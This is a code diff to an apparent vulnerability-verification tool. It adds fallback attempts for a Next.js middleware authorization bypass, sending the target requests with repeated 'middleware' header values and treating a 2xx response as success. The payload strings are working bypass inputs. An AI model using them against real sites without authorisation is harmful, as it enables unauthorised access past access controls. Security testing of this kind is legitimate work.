@@ -6946,6 +6946,34 @@ def verify_generic_header_bypass(
                 status_bypass = -1
                 body_bypass = ""
                 step(f"error en peticion con bypass: {e}")
+            # If first bypass_value didn't work, try common alternate formats
+            # (e.g. Next.js uses both 'pages/_middleware' and 'middleware:...:middleware' variants)
+            if status_bypass not in range(200, 300) and status_normal not in range(200, 300):
+                _bv_base = bypass_value.split(":")[0].strip()
+                _alt_bypass_values = []
+                # 5x-repetition variants for middleware-identity bypass
+                for _bv_alt in (
+                    "pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware",
+                    "middleware:middleware:middleware:middleware:middleware",
+                    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
+                    "pages/_middleware",
+                    "middleware",
+                    "src/middleware",
+                ):
+                    if _bv_alt != bypass_value:
+                        _alt_bypass_values.append(_bv_alt)
+                for _alt_bv in _alt_bypass_values[:5]:
+                    try:
+                        _r_alt = _http_request(m, url, timeout=15, allow_redirects=False,
+                                               headers={bypass_header: _alt_bv})
+                        if _r_alt.status_code in range(200, 300):
+                            step(f"  variante '{_alt_bv}' dio {_r_alt.status_code} → usando este valor")
+                            status_bypass = _r_alt.status_code
+                            body_bypass = _r_alt.text or ""
+                            bypass_value = _alt_bv
+                            break
+                    except Exception:
+                        pass
 
         _bypass_desc = (f"URL manipulada '{bypass_url}'" if bypass_url
                         else f"cabecera '{bypass_header}: {bypass_value}'")
